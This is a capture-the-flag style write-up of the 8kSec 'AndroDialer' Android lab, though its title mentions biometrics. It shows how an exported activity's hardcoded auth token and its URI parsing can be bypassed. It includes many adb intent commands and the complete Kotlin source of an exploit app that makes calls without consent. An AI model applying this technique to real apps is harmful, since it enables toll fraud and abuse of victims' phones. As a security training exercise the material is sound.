---
title: "Biometrics in Android Apps: What Could Possibly Go Wrong and How Attackers Exploit It."
date: 2026-06-10 14:10:00 +0800
categories: [Android]
tags: [Android Pentest, 8ksec, intent, ]
---
# AndroDialer - The Ultimate Phone Experience

In this challenge, `AndroDialer.apk` was provided. On installing over a device running android 16, it looks like a call app with Dialer, Contacts and Recent  feature.

![Dialer Screen of AndroDialer](/images/AndroDialer/image.png)

Dialer Screen of AndroDialer

Our Goal

Create a malicious application that exploits the AndroDialer application to initiate unauthorized phone calls to arbitrary numbers without the victim's consent.

Analysis

As first step of analysis, we opened our target app in `jadx-gui` , we get to see 
`com.eightksec.androdialer.CallHandlerServiceActivity`  is the one activity that’s exported other than `MainActivity` and has no UI.  

![`com.eightksec.androdialer.CallHandlerServiceActivity` as exported activity](/images/AndroDialer/image%201.png)

`com.eightksec.androdialer.CallHandlerServiceActivity` as exported activity

If we analysed `com.eightksec.androdialer.CallHandlerServiceActivity` decompiled code. It was calling startActivity with intent having data `strGroup` (which is basically phone number) and action `android.intent.action.CALL`. 

![making call with the phone number passed in strGroup ](/images/AndroDialer/image%202.png)

making call with the phone number passed in strGroup 

To pass the phone number in `strGroup`, we should have passed `enterprise_auth_token` or `token` which can be one of `8kd1aL3R_s3Cur3_k3Y_2023` and `8kd1aL3R-s3Cur3-k3Y-2023` .

![Validating if `arraryList` has one of the hardcoded secret key among `8kd1aL3R_s3Cur3_k3Y_2023` and `8kd1aL3R-s3Cur3-k3Y-2023`.](/images/AndroDialer/image%203.png)

Validating if `arraryList` has one of the hardcoded secret key among `8kd1aL3R_s3Cur3_k3Y_2023` and `8kd1aL3R-s3Cur3-k3Y-2023`.

if the data (`Uri data = getIntent().getData()`) passed along intent satisfies the condition(`data != null && data.isHierarchical()`)  then we have mainly multiple ways of passing the `enterprise_auth_token` . 
Method 1:
One is as extra along with intent . 

![Parsing `enterprise_auth_token` or `token` and adding to arrayList](/images/AndroDialer/image%204.png)

Parsing `enterprise_auth_token` or `token` and adding to arrayList

Example:

```jsx
adb shell am start \
  -n com.eightksec.androdialer/.CallHandlerServiceActivity \
  -a com.eightksec.androdialer.action.PERFORM_CALL \
  --es "enterprise_auth_token" "8kd1aL3R_s3Cur3_k3Y_2023"
```

Method 2:
Pass it in data where data should have hierarchical structure. 
Eg. `dialersec://call/?enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023`

Method 3: 
Pass `enterprise_auth_token` as segment after `token` maintaining data in hierarchical structure. 
Eg. `dialersec://call/tokn/8kd1aL3R_s3Cur3_k3Y_2023`

Method 4: (4 subcases in fragment itself): 
Passing in fragment of data uri. Eg.
`dialersec://call/?#enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023` 
`dialersec://call/?#token=8kd1aL3R_s3Cur3_k3Y_2023` 
`dialersec://call/#/!&enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023` 
`dialersec://call/#xomthing=random;S.enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023`

Method 5:
Passing in data uri using `;` seperator.
`dialersec://call/test=anything;enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023` 

After passing token, we need to pass the phone number that gets into the `strGroup` variable. Cause now array list will be `greater than 0` than the default value of `i`.

![image.png](/images/AndroDialer/image%205.png)

# Passing number into strGroup

There are multiple method to pass the phone number in `strGroup` over which later call will be made.

Method 1:
As an extra with key `phoneNumber` 

![image.png](/images/AndroDialer/image%206.png)

Eg. 

```jsx
adb shell 'am start \
  -n com.eightksec.androdialer/.CallHandlerServiceActivity \
  -a com.eightksec.androdialer.action.PERFORM_CALL \
  -d "dialersec://call/#/!&enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023" \
  --es phoneNumber 9840341641'
```

Method 2:

Since `strGroup` is equal to `getSchemeSpecificPart()` ; here `getSchemeSpecificPart()`  returns anything between `schema` and segement `#`  Here in schema of data we need to pass `tel`

![image.png](/images/AndroDialer/image%207.png)

Eg. of data of intent
`tel://9810234567/#/!&enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023`

Method 3:
If scheme of data is `dialersec` and host is call   `queryParameter` is null then from path segment its finding the index of `number` than its taking next value just next to the index of number as `strGroup` . So, overall data looks like `dialersec://call/number/9840341641#/!&enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023`
Eg. 

![image.png](/images/AndroDialer/image%208.png)

Method 4:
Just as [Method 3](https://app.notion.com/p/AndroDialer-The-Ultimate-Phone-Experience-3714d591802a80faab2def8503069a34?pvs=21) but parameter has not to be null in data of intent. Eg.
`dialersec://call/?number=9801010101#/!&enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023`

![image.png](/images/AndroDialer/image%209.png)

Method 5 (When scheme is not equal to dialersec): 
 `dataString` is supposed to start with `tel:` and anything after that will be the value of`strGroup` Eg: 

```jsx
adb shell 'am start \
  -n com.eightksec.androdialer/.CallHandlerServiceActivity \
  -a com.eightksec.androdialer.action.PERFORM_CALL \
  -d "tel://9801010101" --es "enterprise_auth_token" "8kd1aL3R_s3Cur3_k3Y_2023"'
```

![image.png](/images/AndroDialer/image%2010.png)

Method 6 (When scheme is not equal to dialersec):
Here it checks for anything digital in `data` and should not have `dialersec` as scheme, any number in data will be extracted and pass to `strGroup` .

```bash
adb shell 'am start \
  -n com.eightksec.androdialer/.CallHandlerServiceActivity \
  -a com.eightksec.androdialer.action.PERFORM_CALL \
  -d "abything12345" --es "enterprise_auth_token" "8kd1aL3R_s3Cur3_k3Y_2023"'
```

![image.png](/images/AndroDialer/image%2011.png)

Method 7: (When scheme is not equal to dialersec)
Here we can pass in any form but we should use `;number=` before passing actual number 

```jsx
adb shell 'am start \
  -n com.eightksec.androdialer/.CallHandlerServiceActivity \
  -a com.eightksec.androdialer.action.PERFORM_CALL \
  -d "anything1231;number=987" --es "enterprise_auth_token" "8kd1aL3R_s3Cur3_k3Y_2023"'
```

![image.png](/images/AndroDialer/image%2012.png)

# Final Execution

If we able to pass number into `strGroup` bypassing any one of the check we have listed above. Then, `strGroup` will get pass and activity with `android.intent.action.CALL` action will start the activity with  `FLAG_ACTIVITY_NEW_TASK` flag, which will be handled by app that makes the call.

![image.png](/images/AndroDialer/image%2013.png)

# Mobile Application code

Since exploit app can be implemented in so many ways, we took the following case as baseline.

```jsx
adb shell 'am start \
  -n com.eightksec.androdialer/.CallHandlerServiceActivity \
  -a com.eightksec.androdialer.action.PERFORM_CALL \
  -d "anything1231;number=987" --es "enterprise_auth_token" "8kd1aL3R_s3Cur3_k3Y_2023"'
```

Source Code:
Fill the phone number, click on Dial, trigger the intent and make call. 

```jsx
package com.nirajneupane08.androdialer

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material3.Button
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import com.nirajneupane08.androdialer.ui.theme.AndroDialerTheme

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            AndroDialerTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    PhoneInputField(
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }
    }
}

@Composable
fun PhoneInputField(modifier: Modifier = Modifier) {
    var phoneNumber by remember { mutableStateOf("") }
    val context = androidx.compose.ui.platform.LocalContext.current
    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(16.dp),
        horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally
    ) {
        OutlinedTextField(
            value = phoneNumber,
            label = { Text("Phone Number") },
            placeholder = { Text("Enter phone number") },
            modifier = Modifier.fillMaxWidth(),
            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
            singleLine = true,
            onValueChange = { phoneNumber = it }
        )
        Spacer(modifier = Modifier.height(16.dp))
        Button(
            onClick = { exploit(context, phoneNumber) },
            modifier = Modifier.fillMaxWidth()
        ) {
            Text("Dial")
        }
    }
}
fun exploit(context: android.content.Context, phoneNumber: String) {
    val intent = Intent("com.eightksec.androdialer.action.PERFORM_CALL")
    intent.setData(android.net.Uri.parse("anything1231;number=$phoneNumber"))
    intent.putExtra("enterprise_auth_token", "8kd1aL3R_s3Cur3_k3Y_2023")
    intent.setClassName("com.eightksec.androdialer", "com.eightksec.androdialer.CallHandlerServiceActivity")
    context.startActivity(intent)
}
@Preview(showBackground = true)
@Composable
fun PhoneInputFieldPreview() {
    AndroDialerTheme {
        PhoneInputField()
    }
}
```